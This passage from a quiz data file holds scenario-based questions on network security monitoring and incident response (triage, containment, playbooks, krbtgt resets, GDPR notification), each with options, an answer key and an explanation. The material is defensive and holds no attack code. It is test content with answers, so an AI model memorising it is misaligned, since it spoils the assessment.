          "Formalize into a Sigma/Suricata/Zeek rule in source control, add unit tests / replay pcaps, peer review, deploy via CI, track FP/TP over time",
          "Only email one person",
          "Delete the hunt notes"
        ],
        correctAnswer: 1,
        explanation: "Ad-hoc hunts must graduate into version-controlled, tested, peer-reviewed detections with measurable outcomes. This is the discipline that separates mature SOCs from alert-driven ones."
      },
      {
        id: "nsm-q6-5",
        difficulty: "medium",
        tags: ["Alert Tuning"],
        scenario: "Your Suricata alert queue averages 4,000 alerts/day; analysts triage <5%.",
        question: "What is the highest-leverage program action?",
        options: [
          "Hire more analysts",
          "Run alert triage analytics (top noisy rules, top sources, false-positive %), then suppress/threshold/rewrite the top 20 offenders and enforce SLA-based tuning ownership",
          "Ignore all alerts",
          "Disable Suricata"
        ],
        correctAnswer: 1,
        explanation: "80/20 always applies: a small number of rules and sources produce most of the noise. Focused, measured tuning with owned SLAs is the fastest path to a workable queue."
      },
      {
        id: "nsm-q6-6",
        difficulty: "medium",
        tags: ["Forensics", "Timeline"],
        scenario: "During an incident you must reconstruct a session-level timeline (who talked to whom, when, over which protocols, how many bytes).",
        question: "Which log is the primary spine?",
        options: [
          "Wireshark packet list",
          "Zeek conn.log (with pivots into http/ssl/dns/files by UID) — the canonical session ledger for NSM",
          "Firewall config",
          "AV logs"
        ],
        correctAnswer: 1,
        explanation: "conn.log is one row per session with timing, byte counts, state, and the UID that ties all other protocol logs together — the natural spine of any network timeline."
      },
      {
        id: "nsm-q6-7",
        difficulty: "hard",
        tags: ["Purple Team"],
        scenario: "Red team simulates a Cobalt Strike HTTPS beacon with a custom malleable C2 profile. Detection misses.",
        question: "Which purple-team output most improves NSM going forward?",
        options: [
          "'Try harder' feedback",
          "Capture PCAP of the exercise, extract JA3/JA3S, URI patterns, cert fingerprints, and beacon cadence; encode as Zeek/Suricata detections and add to CI replay tests",
          "Delete the pcap",
          "Ban red team"
        ],
        correctAnswer: 1,
        explanation: "Purple-team value is convertible artifacts: PCAPs, IOCs, and behavioral fingerprints that become tested, source-controlled detections — closing the loop from adversary emulation to durable coverage."
      },
      {
        id: "nsm-q6-8",
        difficulty: "hard",
        tags: ["Metrics", "Program"],
        scenario: "Leadership asks for meaningful NSM program metrics beyond 'alerts per day'.",
        question: "Which metric set is most defensible?",
        options: [
          "Alerts/day only",
          "Detection coverage vs. ATT&CK, MTTD/MTTR for network-origin incidents, precision (TP rate) per rule, sensor health (drop rate, capture loss), and hunt-to-detection conversion",
          "Number of rules total",
          "Uptime of SIEM only"
        ],
        correctAnswer: 1,
        explanation: "Mature NSM programs report on coverage (ATT&CK), effectiveness (MTTD/MTTR, precision), health (drops, loss), and engineering output (hunts becoming durable detections)."
      },
      {
        id: "nsm-q6-9",
        difficulty: "hard",
        tags: ["Encrypted DNS", "DoH"],
        scenario: "Endpoints have started using DNS-over-HTTPS (DoH) to public resolvers, bypassing your recursive resolver logs.",
        question: "Which control best restores DNS visibility?",
        options: [
          "Ignore DNS entirely now",
          "Enterprise policy to disable browser/OS DoH or force it through an internal DoH resolver; block known DoH providers at egress; monitor TLS SNI/JA3 to public DoH endpoints",
          "Block all HTTPS",
          "Trust the endpoint"
        ],
        correctAnswer: 1,
        explanation: "DoH breaks passive resolver telemetry. Restore visibility by policy (disable/redirect DoH), egress controls to known DoH endpoints, and TLS metadata monitoring for attempted bypass."
      },
      {
        id: "nsm-q6-10",
        difficulty: "medium",
        tags: ["Program Maturity"],
        scenario: "You're building a 12-month NSM roadmap. Rank the highest-leverage foundational investment.",
        question: "Which comes first?",
        options: [
          "Buy the most expensive commercial IPS",
          "Get reliable, complete capture (TAPs, packet broker, no drops) and normalized Zeek+Suricata metadata into the SIEM — no detection matters without trustworthy telemetry",
          "Hire more junior analysts first",
          "Publish a marketing blog"
        ],
        correctAnswer: 1,
        explanation: "Detection engineering, hunting, and IR all rest on telemetry integrity. Fixing capture and pipeline hygiene first pays compounding dividends on every downstream investment."
      }
    ]
  },
  {
      quizId: "ir-q1",
      courseId: "incident-response",
      title: "IR Foundations & Frameworks",
      description: "Scenario-based assessment of NIST SP 800-61r2, SANS PICERL, and IR team structures under real-world pressure.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q1-1",
              difficulty: "easy",
              tags: [
                  "NIST",
                  "Event vs Incident"
              ],
              scenario: "At 02:14 UTC your SIEM fires: 'EventID 4625 x38 for svc_backup from 10.14.3.9 in 90s'. The account is not locked out, no data has moved, and no policy has been violated yet.",
              question: "Under NIST SP 800-61r2, is this an event or an incident, and why?",
              options: [
                  "Incident — any authentication failure is a policy violation",
                  "Event — an observable occurrence; it becomes an incident only when it violates or imminently threatens a security policy",
                  "Incident — service accounts must never fail authentication",
                  "Event — because it happened outside business hours"
              ],
              correctAnswer: 1,
              explanation: "NIST defines an event as any observable occurrence. It escalates to an incident when it violates (or imminently threatens) confidentiality, integrity, availability, AUP, or standard practices. Failed logins alone are events until context (e.g., password spray, later success) crosses that line."
          },
          {
              id: "ir-q1-2",
              difficulty: "easy",
              tags: [
                  "NIST Lifecycle"
              ],
              scenario: "A junior analyst confirms ransomware on a file server, immediately reimages it, then asks what to do next.",
              question: "Which NIST phase did the analyst skip, and what is the consequence?",
              options: [
                  "Skipped Preparation — no impact on this case",
                  "Skipped Containment & evidence collection — root cause, scope, and lateral movement can no longer be reconstructed",
                  "Skipped Recovery — the server should have stayed offline longer",
                  "Skipped Lessons Learned — only affects reporting"
              ],
              correctAnswer: 1,
              explanation: "NIST places Containment/Eradication/Recovery after evidence-preserving analysis. Reimaging before triage destroys memory, event logs, and artifacts needed to identify patient zero and the blast radius, guaranteeing re-compromise via the same vector."
          },
          {
              id: "ir-q1-3",
              difficulty: "medium",
              tags: [
                  "SANS PICERL",
                  "Containment"
              ],
              scenario: "A crypto-miner is beaconing from 47 Linux hosts across three subnets. Business asks: 'Just block the C2 IP at the firewall — done, right?'",
              question: "How does SANS PICERL distinguish short-term vs long-term containment here?",
              options: [
                  "Short-term = block C2 IP to stop bleeding; long-term = patch the exploited service, rotate keys, harden images, then rebuild",
                  "Short-term and long-term are the same action performed twice",
                  "Long-term containment means leaving the malware running to study it",
                  "Short-term containment means notifying customers"
              ],
              correctAnswer: 0,
              explanation: "Short-term containment stops active harm quickly (block IP, isolate VLAN). Long-term containment applies durable fixes (patch, credential rotation, golden image) so eradication and recovery don't just restore the vulnerable state."
          },
          {
              id: "ir-q1-4",
              difficulty: "medium",
              tags: [
                  "Team Structure",
                  "CSIRT"
              ],
              scenario: "Your 24x7 SOC triages alerts but every confirmed intrusion is handed off to a small forensics team that also builds detections and negotiates with legal.",
              question: "Which structural weakness will surface first under a major incident?",
              options: [
                  "Nothing — this is the recommended NIST model",
                  "Role conflict and burnout: the same team cannot simultaneously respond, engineer detections, and manage legal/comms at incident tempo",
                  "SOC analysts should also negotiate with legal",
                  "Forensics teams should own tier-1 triage"
              ],
              correctAnswer: 1,
              explanation: "Mature IR separates responders, detection engineers, forensic/malware analysts, and comms/legal liaisons. Overloading one team creates decision bottlenecks, evidence errors, and analyst attrition — the #1 predictor of blown SLAs during real incidents."
          },
          {
              id: "ir-q1-5",
              difficulty: "medium",
              tags: [
                  "RACI",
                  "Decision Rights"
              ],
              scenario: "During an active ransomware event, the CISO, IT Director, and General Counsel each issue conflicting containment orders in Slack within 10 minutes.",
              question: "Which artifact prevents this failure mode?",
              options: [
                  "A larger Slack channel",
                  "A pre-approved RACI matrix + declared Incident Commander with unambiguous decision authority",
                  "More SIEM dashboards",
                  "A press release template"
              ],
              correctAnswer: 1,
              explanation: "IR needs a single Incident Commander with pre-authorized decision rights, backed by a RACI. Without it, tempo collapses into consensus-seeking during the exact minutes attackers exploit. This is why NIST 'Preparation' includes governance, not just tooling."
          },
          {
              id: "ir-q1-6",
              difficulty: "medium",
              tags: [
                  "Preparation",
                  "Jump Kit"
              ],
              scenario: "Your responder arrives on-site and finds the compromised network is fully segmented from the internet. They cannot download tools.",
              question: "Which Preparation-phase item would have prevented this delay?",
              options: [
                  "A written IR policy",
                  "An offline, versioned jump kit (write-blocker, imager, trusted binaries, sysinternals, memory acquisition, known-good OS) on removable media",
                  "A larger SIEM license",
                  "A vendor MSSP contract"
              ],
              correctAnswer: 1,
              explanation: "Jump kits are a Preparation deliverable: pre-vetted, offline tools + trusted binaries so responders operate in hostile/air-gapped networks without introducing supply-chain risk or waiting on procurement."
          },
          {
              id: "ir-q1-7",
              difficulty: "hard",
              tags: [
                  "Chain of Custody",
                  "Legal"
              ],
              scenario: "An analyst copies suspicious files off the victim host with SMB drag-and-drop, emails them to a colleague, and later legal asks whether these can be used in court.",
              question: "What is the most defensible answer?",
              options: [
                  "Yes — copies are always admissible",
                  "Likely no — no write-blocker, no hash-verified image, no documented chain of custody; evidentiary weight is severely degraded",
                  "Yes — as long as antivirus scanned them",
                  "No — digital evidence is never admissible"
              ],
              correctAnswer: 1,
              explanation: "Legally usable evidence requires forensically sound acquisition (write-blocked or verified imaging), cryptographic hashing before/after, and an unbroken chain of custody log (who/when/why/where). Casual SMB copies break all three."
          },
          {
              id: "ir-q1-8",
              difficulty: "hard",
              tags: [
                  "Severity Classification"
              ],
              scenario: "Same malware family detonates on: (A) an isolated marketing laptop, (B) a domain controller, (C) a PCI cardholder-data segment host.",
              question: "Under a standard severity model, why do these get different severities despite identical malware?",
              options: [
                  "They shouldn't — malware family sets severity",
                  "Severity is business-impact driven: asset criticality, data classification, and blast radius dominate — not the malware family",
                  "The DC is always the lowest because it's well-monitored",
                  "PCI hosts are always lowest severity"
              ],
              correctAnswer: 1,
              explanation: "Severity models (e.g., FIRST CVSS-BT, internal tiers) weight asset criticality, data sensitivity (PCI/PHI/PII), lateral pivot potential, and recoverability. Identical TTPs on a DC or PCI host imply enterprise-wide compromise or regulated breach exposure — not comparable to a standalone laptop."
          },
          {
              id: "ir-q1-9",
              difficulty: "hard",
              tags: [
                  "Third Parties",
                  "MSSP"
              ],
              scenario: "Your MSSP detects the alert but escalates 47 minutes late because their SLA is 'best effort during business hours' and the incident began at 03:00.",
              question: "Which Preparation gap does this expose?",
              options: [
                  "None — MSSPs are always best-effort",
                  "Contractual: SLAs, escalation trees, on-call rosters, and joint runbooks were never tested end-to-end at 3am",
                  "Technical: the SIEM was misconfigured",
                  "Legal: no press release template existed"
              ],
              correctAnswer: 1,
              explanation: "Preparation includes vendor governance: measurable SLAs, 24x7 escalation trees, quarterly tabletop with the MSSP, and joint runbooks. Untested contracts are the single most common cause of late external escalations."
          },
          {
              id: "ir-q1-10",
              difficulty: "hard",
              tags: [
                  "Framework Comparison"
              ],
              scenario: "Leadership asks: 'Should we adopt NIST 800-61r2 or SANS PICERL as our IR framework?'",
              question: "What is the most accurate answer?",
              options: [
                  "NIST — it is legally required",
                  "SANS — because it has 6 phases instead of 4",
                  "Either — they are conceptually equivalent (Prep / Detect+Analyze / Contain-Eradicate-Recover / Post-Incident); pick one, tailor playbooks, and be consistent",
                  "Neither — build your own from scratch"
              ],
              correctAnswer: 2,
              explanation: "NIST's 4 phases and SANS's 6 phases (PICERL) cover the same lifecycle at different granularities. Regulators care that you follow *a* recognized framework consistently and can evidence it — not which one."
          }
      ]
  },
  {
      quizId: "ir-q2",
      courseId: "incident-response",
      title: "IR Policy, Plans & Playbooks",
      description: "Scenario-based questions on the policy/plan/playbook hierarchy, communications, legal holds, and playbook design.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q2-1",
              difficulty: "easy",
              tags: [
                  "Policy vs Plan vs Playbook"
              ],
              scenario: "Your auditor finds three documents: (1) a 2-page executive charter granting the CSIRT authority to disconnect any asset, (2) a 40-page IR plan describing lifecycle, roles, and metrics, (3) a 6-page ransomware runbook with exact commands.",
              question: "Map each to Policy / Plan / Playbook.",
              options: [
                  "1=Playbook, 2=Policy, 3=Plan",
                  "1=Policy, 2=Plan, 3=Playbook",
                  "1=Plan, 2=Playbook, 3=Policy",
                  "All three are policies"
              ],
              correctAnswer: 1,
              explanation: "Policy grants authority and sets intent (short, exec-signed). Plan operationalizes policy (roles, lifecycle, metrics). Playbooks are scenario-specific step-by-step procedures. Each layer changes at a different cadence and needs different reviewers."
          },
          {
              id: "ir-q2-2",
              difficulty: "easy",
              tags: [
                  "Playbook Design"
              ],
              scenario: "Your ransomware playbook reads: 'The analyst should investigate the affected system and take appropriate action.'",
              question: "What is wrong with this instruction?",
              options: [
                  "Nothing — analysts need flexibility",
                  "It is not a playbook step — no decision criteria, owner, action, tool, or expected artifact; it cannot be executed under pressure",
                  "It should be in the policy instead",
                  "It should be longer"
              ],
              correctAnswer: 1,
              explanation: "Effective playbook steps are executable: trigger, decision criteria, actor role, exact command/tool, expected output, and next-step branch. Vague prose collapses at 3am when the on-call has 90 seconds to act."
          },
          {
              id: "ir-q2-3",
              difficulty: "medium",
              tags: [
                  "Communications Plan"
              ],
              scenario: "Mid-incident, an engineer posts screenshots of attacker C2 traffic in the company-wide #general Slack channel.",
              question: "Which control should have prevented this?",
              options: [
                  "A ban on Slack",
                  "A pre-defined communications plan: dedicated out-of-band incident channel, named spokespeople, and a 'need-to-know' rule",
                  "A stricter firewall",
                  "Nothing — transparency is good"
              ],
              correctAnswer: 1,
              explanation: "IR comms plans define who talks, where, and to whom. Attackers monitor Slack/Teams after credential theft; leaked TTPs let them pivot, wipe, or accelerate. Out-of-band, need-to-know channels are non-negotiable."
          },
          {
              id: "ir-q2-4",
              difficulty: "medium",
              tags: [
                  "Out-of-Band"
              ],
              scenario: "During an AD compromise the team coordinates in Microsoft Teams — which uses the same compromised AD for auth.",
              question: "Why is this a critical mistake?",
              options: [
                  "It isn't — Teams is encrypted",
                  "The attacker with AD control can read, join, or lock the response channel; comms must move to an out-of-band, independently-authenticated channel (e.g., Signal, phone bridge)",
                  "Teams is too slow",
                  "It violates GDPR"
              ],
              correctAnswer: 1,
              explanation: "If the attacker owns the auth plane (AD, IdP, SSO), any tool that trusts it is compromised. Every mature IR plan pre-provisions an out-of-band bridge (Signal group, PSTN conference, standalone accounts) with printed contact rosters."
          },
          {
              id: "ir-q2-5",
              difficulty: "medium",
              tags: [
                  "Legal Hold"
              ],
              scenario: "Two days into a suspected insider data-theft case, an admin runs the scheduled 30-day log rotation and wipes proxy/DNS logs for the suspect window.",
              question: "Which Preparation-phase control failed?",
              options: [
                  "Backups",
                  "Legal-hold / preservation procedure — once litigation is reasonably anticipated, routine deletion must be suspended for relevant custodians and systems",
                  "Firewall rules",
                  "MFA"
              ],
              correctAnswer: 1,
              explanation: "Legal hold (litigation hold) is a documented procedure to freeze retention on relevant data the moment an incident with legal exposure is identified. Its absence can lead to spoliation sanctions and destroys the case."
          },
          {
              id: "ir-q2-6",
              difficulty: "medium",
              tags: [
                  "Tabletop Exercises"
              ],
              scenario: "You've had an IR plan for 3 years. You've never run a tabletop.",
              question: "What is the most likely first failure in a real event?",
              options: [
                  "SIEM crashes",
                  "Coordination failure — unknown escalation paths, missing phone numbers, unclear authority, untested vendor SLAs",
                  "The malware is undetected",
                  "The firewall fails open"
              ],
              correctAnswer: 1,
              explanation: "Post-incident reviews consistently show the first casualty of unexercised plans is coordination, not tooling. Tabletops surface stale contacts, ambiguous authority, and missing playbook branches before an adversary does."
          },
          {
              id: "ir-q2-7",
              difficulty: "hard",
              tags: [
                  "Playbook Structure"
              ],
              scenario: "You're designing a phishing playbook. Which structure best supports on-call analysts?",
              question: "Pick the strongest design.",
              options: [
                  "One monolithic 40-page document",
                  "Trigger → Triage (inputs, decision tree) → Containment (exact actions per system) → Eradication → Recovery → Comms → Evidence checklist → Metrics — all fitting on printable cards",
                  "A single decision tree with no actions",
                  "A policy statement only"
              ],
              correctAnswer: 1,
              explanation: "Executable playbooks are structured around the lifecycle with explicit inputs/outputs at each stage, embedded decision criteria, and pre-authored artifacts (comms templates, evidence checklists). Printable/segmentable so they survive tool outages."
          },
          {
              id: "ir-q2-8",
              difficulty: "hard",
              tags: [
                  "Authority",
                  "Kill Switch"
              ],
              scenario: "Ransomware is spreading. The on-call analyst wants to null-route the affected /24, but nobody knows who can authorize it at 03:00.",
              question: "Which policy element is missing?",
              options: [
                  "A stricter password policy",
                  "Pre-authorized emergency actions ('break-glass') delegated in policy to the on-call IC — with defined guardrails and post-hoc review",
                  "A new SIEM",
                  "A patch policy"
              ],
              correctAnswer: 1,
              explanation: "Mature IR policies pre-authorize specific containment actions (isolate host, block IP range, disable account) to named roles under defined conditions, with mandatory post-action review. Otherwise every incident stalls waiting for a VP callback."
          },
          {
              id: "ir-q2-9",
              difficulty: "hard",
              tags: [
                  "Regulatory Notification"
              ],
              scenario: "You confirm exfiltration of EU customer PII at 09:00 Monday. Legal asks how quickly you must notify.",
              question: "What does GDPR Article 33 require, and what does the plan need to support it?",
              options: [
                  "30 days — no plan needed",
                  "Without undue delay and within 72 hours of becoming aware — the plan must define 'awareness', evidence timestamps, decision authority, and DPA contact procedure",
                  "24 hours — via press release",
                  "Only if fine is likely"
              ],
              correctAnswer: 1,
              explanation: "GDPR Art. 33 mandates supervisory-authority notification within 72 hours of awareness (unless unlikely to risk rights/freedoms). The IR plan must define 'awareness', maintain evidentiary timestamps, and pre-identify the DPA notification path — this is a Preparation deliverable."
          },
          {
              id: "ir-q2-10",
              difficulty: "hard",
              tags: [
                  "Playbook Lifecycle"
              ],
              scenario: "Your ransomware playbook still references a decommissioned EDR product.",
              question: "Which governance control is missing?",
              options: [
                  "Larger playbook",
                  "Versioning + a scheduled review cadence (e.g., quarterly + after every incident + after tool changes) with an owner",
                  "More screenshots",
                  "Executive signature"
              ],
              correctAnswer: 1,
              explanation: "Playbooks decay faster than any other IR artifact because tools, teams, and threats change monthly. Governance requires named owners, versioning, and a triggered-review policy (change control, post-incident, threat evolution) — otherwise responders execute fiction."
          }
      ]
  },
  {
      quizId: "ir-q3",
      courseId: "incident-response",
      title: "Detection & Initial Triage",
      description: "Scenario-based triage: separating signal from noise, prioritization, and first-hour analyst decisions.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q3-1",
              difficulty: "easy",
              tags: [
                  "Triage",
                  "Prioritization"
              ],
              scenario: "Queue at 09:00: (A) EDR: 'mimikatz.exe' string on DC01, (B) 12,000 failed logins for one user in 5m, (C) proxy: 400MB upload from finance host to unknown domain, (D) AV cleaned an EICAR test file.",
              question: "Which do you triage first and why?",
              options: [
                  "D — recent AV activity",
                  "A — credential theft tooling on a Tier-0 asset (DC) is highest blast radius",
                  "B — brute force is always critical",
                  "C — data always matters most"
              ],
              correctAnswer: 1,
              explanation: "Prioritization is (impact × likelihood). Credential-theft tooling on a domain controller implies potential enterprise-wide compromise via Kerberos/DCSync — dwarfs a brute force (mitigated by lockout) or a single exfil alert that will still be there in 10 minutes."
          },
          {
              id: "ir-q3-2",
              difficulty: "easy",
              tags: [
                  "Signal vs Noise"
              ],
              scenario: "A rule alerts on every PowerShell execution. You get 4,000 hits/day and confirmed incidents are missed in the queue.",
              question: "Which detection principle is violated?",
              options: [
                  "None — more alerts is safer",
                  "Precision — high-volume/low-precision detections cause alert fatigue and mask true positives; refine with parent process, command-line, user context, or convert to hunt telemetry",
                  "Recall — the rule should fire more",
                  "Encryption — logs should be encrypted"
              ],
              correctAnswer: 1,
              explanation: "Detection quality is measured by precision (TP / (TP+FP)) and recall. High-recall/low-precision rules become noise. Tighten with context (unusual parent, encoded/obfuscated, off-hours, non-admin user) or downgrade to hunting telemetry."
          },
          {
              id: "ir-q3-3",
              difficulty: "medium",
              tags: [
                  "Alert Enrichment"
              ],
              scenario: "You receive: 'EDR: suspicious PowerShell on WKS-4471 by user jsmith at 14:02 UTC'. Nothing else.",
              question: "What enrichment do you fetch before deciding?",
              options: [
                  "Only the raw command line",
                  "Parent/grandparent process, full decoded command line, user role/asset criticality, geo/VPN of session, recent auth for user, prior similar alerts, hash reputation, related network events in ±10m",
                  "Just the hostname",
                  "Only the alert count"
              ],
              correctAnswer: 1,
              explanation: "Triage is enrichment-driven: process ancestry (WINWORD→POWERSHELL is very different from EXPLORER→POWERSHELL), decoded arguments, identity context, historical baseline, and correlated network activity turn a single string into a defensible verdict."
          },
          {
              id: "ir-q3-4",
              difficulty: "medium",
              tags: [
                  "True/False Positive"
              ],
              scenario: "Alert: 'psexec.exe on FS-03'. Investigation shows it was run by the IT admin during a documented change window from their jumpbox.",
              question: "Correct classification?",
              options: [
                  "False Positive",
                  "True Positive - Benign (behavior detected accurately but expected/authorized) — feed back into tuning as an allowlist, not a rule deletion",
                  "False Negative",
                  "Incident"
              ],
              correctAnswer: 1,
              explanation: "The rule correctly detected the behavior — that's not a false positive. It is a benign true positive; the correct action is scoped suppression (this admin, jumpbox, change window) so future rule fidelity is preserved."
          },
          {
              id: "ir-q3-5",
              difficulty: "medium",
              tags: [
                  "Pyramid of Pain"
              ],
              scenario: "Your IOC feed adds 200 new adversary IPs weekly. You block them at the firewall. Detections still miss the actor.",
              question: "Which model explains the gap?",
              options: [
                  "Cyber Kill Chain",
                  "Pyramid of Pain — IPs/hashes are trivial for the adversary to change; detecting TTPs (behavioral) causes durable pain",
                  "MITRE D3FEND only",
                  "STRIDE"
              ],
              correctAnswer: 1,
              explanation: "Bianco's Pyramid of Pain: hash/IP/domain indicators are cheap to rotate; tools are harder; TTPs are hardest and most durable. Detection strategy should be layered but weighted toward behavior (ATT&CK-aligned) for real friction."
          },
          {
              id: "ir-q3-6",
              difficulty: "medium",
              tags: [
                  "First Hour"
              ],
              scenario: "A True Positive intrusion is confirmed at 14:02. What are the first-hour minimum artifacts to preserve before any remediation?",
              question: "Pick the strongest checklist.",
              options: [
                  "Reimage immediately",
                  "Volatile-first triage: memory image, running process list, netstat/conntrack, current logons, autoruns, recent event logs, EDR timeline export, DNS/proxy for host — with hashes and timestamps",
                  "Only screenshots",
                  "Only the malware sample"
              ],
              correctAnswer: 1,
              explanation: "Order of volatility (RFC 3227) drives triage: RAM, network state, logged-on users, and ephemeral artifacts vanish first. Capture these before containment actions that reboot, disconnect, or reimage."
          },
          {
              id: "ir-q3-7",
              difficulty: "hard",
              tags: [
                  "Base-Rate Fallacy"
              ],
              scenario: "An ML detection is 99% accurate. It alerts once per 10,000 events. Your environment produces 5M events/day.",
              question: "How many false positives per day should you expect, and what's the analyst lesson?",
              options: [
                  "~50 — accuracy is fine",
                  "~4,995 FPs/day (0.01% of ~5M) if the true positive rate is ~1/10,000 — 'accuracy' is the wrong metric; measure precision and analyst-hours-per-TP",
                  "Zero — 99% is perfect",
                  "500 — but they self-resolve"
              ],
              correctAnswer: 1,
              explanation: "The base-rate fallacy: at very low incident prevalence, even a highly 'accurate' classifier drowns analysts in false positives. Detection ROI is measured in precision, analyst minutes per TP, and mean-time-to-triage — not headline accuracy."
          },
          {
              id: "ir-q3-8",
              difficulty: "hard",
              tags: [
                  "Correlation"
              ],
              scenario: "Three low-severity alerts in the same 20 minutes on one host: (1) Office spawns cmd.exe, (2) new scheduled task, (3) outbound to a newly-registered domain.",
              question: "Correct triage move?",
              options: [
                  "Close each as low",
                  "Treat as a correlated intrusion chain (Initial Access → Persistence → C2); escalate as High and preserve volatile evidence immediately",
                  "Wait for a 4th alert",
                  "Ignore — Office spawning cmd is normal"
              ],
              correctAnswer: 1,
              explanation: "Individually low, together they trace a kill-chain progression on a single asset within a short window. Correlation (host+user+time) upgrades severity and is the whole point of a SIEM/XDR layer over point tools."
          },
          {
              id: "ir-q3-9",
              difficulty: "hard",
              tags: [
                  "Cognitive Bias"
              ],
              scenario: "An analyst decides it's benign in the first 30 seconds and then only cites evidence that supports 'benign', dismissing contradicting artifacts.",
              question: "Which bias is this and what's the mitigation?",
              options: [
                  "Anchoring — ignore it",
                  "Confirmation bias — mitigate with structured analytic techniques (ACH, red-team review, mandatory 'what would prove me wrong?' step)",
                  "Availability bias — resolved by more caffeine",
                  "Not a bias — normal triage"
              ],
              correctAnswer: 1,
              explanation: "Confirmation bias is the leading cognitive failure in triage. Mitigations include structured techniques (Analysis of Competing Hypotheses), peer review on TP/FP calls, and forcing a disconfirming-evidence step in the playbook."
          },
          {
              id: "ir-q3-10",
              difficulty: "hard",
              tags: [
                  "Escalation Criteria"
              ],
              scenario: "A Tier-1 analyst sits on a suspicious alert for 45 minutes 'to investigate a little more' before escalating.",
              question: "Which governance control is missing?",
              options: [
                  "None — analyst discretion is best",
                  "Time-boxed escalation criteria: explicit triggers (evidence of persistence, credential theft, DC/PCI/PHI asset, exfil, etc.) plus a hard time cap on tier-1 handling",
                  "Larger monitors",
                  "More SIEM licenses"
              ],
              correctAnswer: 1,
              explanation: "Escalation must be deterministic: named triggers and a maximum tier-1 dwell before automatic hand-off. Analyst hesitation is the single largest contributor to elevated MTTD/MTTR."
          }
      ]
  },
  {
      quizId: "ir-q4",
      courseId: "incident-response",
      title: "Containment, Eradication & Recovery",
      description: "Scenario-based CER decisions: isolation strategy, eradication depth, and safe recovery under business pressure.",
      passingScore: 70,
      timeLimit: 25,
      questions: [
          {
              id: "ir-q4-1",
              difficulty: "easy",
              tags: [
                  "Network Isolation"
              ],
              scenario: "A workstation is beaconing to known C2. The user is a C-level exec on a video call.",
              question: "Best containment action?",
              options: [
                  "Nothing until the call ends",
                  "EDR network-contain (allow EDR management, block all else) — preserves forensic state, stops C2, avoids full reboot; then coordinate with the exec",
                  "Reimage immediately",
                  "Power off the laptop"
              ],
              correctAnswer: 1,
              explanation: "EDR network containment is precisely designed for this: severs adversary access while retaining volatile artifacts and EDR telemetry, unlike a hard power-off (destroys RAM) or reimage (destroys evidence and re-creates conflict with the exec)."
          },
          {
              id: "ir-q4-2",
              difficulty: "easy",
              tags: [
                  "Credential Rotation"
              ],
              scenario: "You confirm an attacker had SYSTEM on a domain-joined server for 6 hours.",
              question: "Which credentials must you consider potentially compromised?",
              options: [
                  "Only the local admin",
                  "Every credential exposed to that host: local accounts, cached domain creds, service accounts running on it, Kerberos tickets, and any account that authenticated during the window",
                  "Only the last-logged-in user",
                  "None if AV is clean"
              ],
              correctAnswer: 1,
              explanation: "SYSTEM on a Windows host can extract LSASS, DPAPI, cached creds, and Kerberos TGTs. Assume every credential material *present or arriving* during the compromise window is exposed — rotate broadly and force TGT refresh."
          },
          {
              id: "ir-q4-3",
              difficulty: "medium",
              tags: [
                  "Short vs Long Containment"
              ],
              scenario: "Ransomware detected on 8 hosts in one VLAN. Business begs you not to isolate the VLAN because it hosts revenue-critical apps.",
              question: "How do you decide?",
              options: [
                  "Always isolate immediately",
                  "Weigh spread velocity vs revenue impact using pre-approved thresholds; if spread is active, isolate now — pre-approved authority avoids case-by-case debate mid-incident",
                  "Never isolate revenue systems",
                  "Ask on Twitter"
              ],
              correctAnswer: 1,
              explanation: "Containment decisions are business-risk calls that must be pre-authorized in policy with thresholds (spread rate, asset class, data classification). Mid-incident negotiation is the failure mode ransomware operators depend on."
          },
          {
              id: "ir-q4-4",
              difficulty: "medium",
              tags: [
                  "Eradication Depth"
              ],
              scenario: "You remove the malware binary and its scheduled task. Two days later the host beacons again.",
              question: "Which eradication step was skipped?",
              options: [
                  "Antivirus scan",
                  "Full persistence sweep + root-cause remediation: WMI subs, services, drivers, DLL hijacks, run keys, RMM tools, valid accounts, and the *initial access vector* itself",
                  "Reboot",
                  "Password change on the admin only"
              ],
              correctAnswer: 1,
              explanation: "Adversaries plant multiple persistence mechanisms (services, WMI, scheduled tasks, run keys, RMM, valid accounts, driver-level). Eradication must enumerate all of them AND close the initial-access vector, or re-compromise is near-certain."
          },
          {
              id: "ir-q4-5",
              difficulty: "medium",
              tags: [
                  "Golden Ticket"
              ],
              scenario: "You confirm the attacker extracted the krbtgt hash from a DC three weeks ago.",
              question: "What eradication step is mandatory?",
              options: [
                  "Reboot the DC",
                  "Double krbtgt password reset (twice, with wait for replication and ticket lifetime in between) to invalidate all forgeable golden tickets",
                  "Rotate the affected user's password",
                  "Disable SMBv1"
              ],
              correctAnswer: 1,
              explanation: "krbtgt compromise = full Kerberos forgery capability (golden tickets, valid for the ticket lifetime, up to 10 years by default). The documented remediation is two sequential krbtgt resets separated by replication + max ticket lifetime."
          },
          {
              id: "ir-q4-6",
              difficulty: "medium",
              tags: [
                  "Backup Recovery"
              ],
              scenario: "You restore from a backup taken 5 days before detection.",
              question: "What must you verify before returning to production?",
              options: [
                  "That the backup boots",
                  "That the backup pre-dates initial compromise (not just detection), is malware-free, patches the exploited vector, and enters a monitored quarantine before full trust",
                  "Nothing — backups are trusted",
                  "That the backup is the newest available"
              ],
              correctAnswer: 1,
              explanation: "Dwell time is usually much longer than time-to-detection. The correct backup pre-dates *initial* compromise, is verified malware-free, is patched for the entry vector, and gets extra monitoring during a probation window."
          },
          {
              id: "ir-q4-7",
              difficulty: "hard",
              tags: [
                  "Root Cause"
              ],
              scenario: "Recovery is complete. Post-incident, someone asks: 'What was the root cause?' The team answers: 'Malware got in.'",
              question: "Why is this insufficient?",
              options: [
                  "It isn't",
                  "'Malware got in' is the symptom. Root cause is the systemic gap that allowed it (unpatched Exchange CVE, missing MFA, allowed macro from external sender, exposed RDP, unmonitored service account) — only fixing that prevents recurrence",
                  "Malware is always the root cause",
                  "Root cause analysis is optional"
              ],
              correctAnswer: 1,
              explanation: "Root cause is the systemic failure (control gap, misconfiguration, process defect) that enabled the intrusion. Without naming it, remediation is cosmetic and re-compromise metrics will show it within weeks."
          },
          {
              id: "ir-q4-8",
              difficulty: "hard",
              tags: [
                  "Watch & Learn vs Contain"
              ],
              scenario: "You detect a sophisticated actor doing recon. Executives want to 'watch and learn' to gather intel; legal wants immediate containment.",
              question: "Which framing is correct?",
              options: [
                  "Always watch — intel is priceless",
